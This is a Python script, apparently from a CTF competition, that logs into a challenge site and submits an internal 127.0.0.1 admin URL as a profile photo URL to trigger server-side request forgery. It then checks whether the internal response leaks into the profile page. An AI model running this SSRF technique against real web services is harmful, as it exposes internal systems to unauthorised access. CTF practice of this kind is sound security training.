#!/usr/bin/env python3
import requests

# Target URL
BASE_URL = "http://ctf.compfest.id:7302"

def register_and_login():
    """Register a new user and login"""
    username = "debug_profile"
    password = "debug123"
    
    # Register
    data = {'username': username, 'password': password}
    requests.post(f"{BASE_URL}/register", data=data)
    
    # Login
    response = requests.post(f"{BASE_URL}/login", data=data, allow_redirects=False)
    if response.status_code == 302:
        return response.cookies
    return None

def debug_profile():
    """Debug what happens with profile after SSRF"""
    print("[+] Debugging profile after SSRF...")
    
    # Get session
    cookies = register_and_login()
    if not cookies:
        print("[-] Failed to login!")
        return
    
    print("[+] Successfully logged in!")
    
    # Step 1: Check initial profile state
    print("[+] Step 1: Checking initial profile state...")
    
    profile_response = requests.get(f"{BASE_URL}/profile", cookies=cookies)
    
    if profile_response.status_code == 200:
        if "No profile content set" in profile_response.text:
            print("[+] Initial state: No profile content")
        else:
            print("[+] Initial state: Has profile content")
    
    # Step 2: Trigger SSRF
    print("[+] Step 2: Triggering SSRF...")
    
    url = "http://127.0.0.1:5000/internal/admin/search"
    
    data = {'photo_url': url}
    
    try:
        response = requests.post(f"{BASE_URL}/profile", data=data, cookies=cookies, timeout=10)
        
        if response.status_code == 200:
            print("[+] SSRF request successful!")
            
            # Step 3: Check profile again
            print("[+] Step 3: Checking profile after SSRF...")
            
            profile_response = requests.get(f"{BASE_URL}/profile", cookies=cookies)
            
            if profile_response.status_code == 200:
                print("[+] Profile page loaded successfully")
                
                # Check for different content types
                if "Failed to render as image" in profile_response.text:
                    print("[+] Found 'Failed to render as image' message")
                    
                    # Extract error preview
                    start = profile_response.text.find("<pre>")
                    end = profile_response.text.find("</pre>")
                    if start != -1 and end != -1:
                        preview = profile_response.text[start+5:end]
                        print(f"[+] Error preview content: {preview}")
                    else:
                        print("[+] No <pre> tag found")
                
                elif "profile-picture" in profile_response.text:
                    print("[+] Found profile picture - content was treated as image")
                    
                    # Look for the image source
                    if "uploads/" in profile_response.text:
                        print("[+] Profile picture points to uploads/ directory")
                
                elif "No profile content set" in profile_response.text:
                    print("[+] Still no profile content - SSRF might have failed")
                
                else:
                    print("[+] Unexpected profile state")
                    print(f"[+] Profile page preview: {profile_response.text[:500]}")
            else:
                print(f"[-] Failed to access profile: {profile_response.status_code}")
        
    except Exception as e:
        print(f"[-] Error: {e}")

if __name__ == "__main__":
    debug_profile()
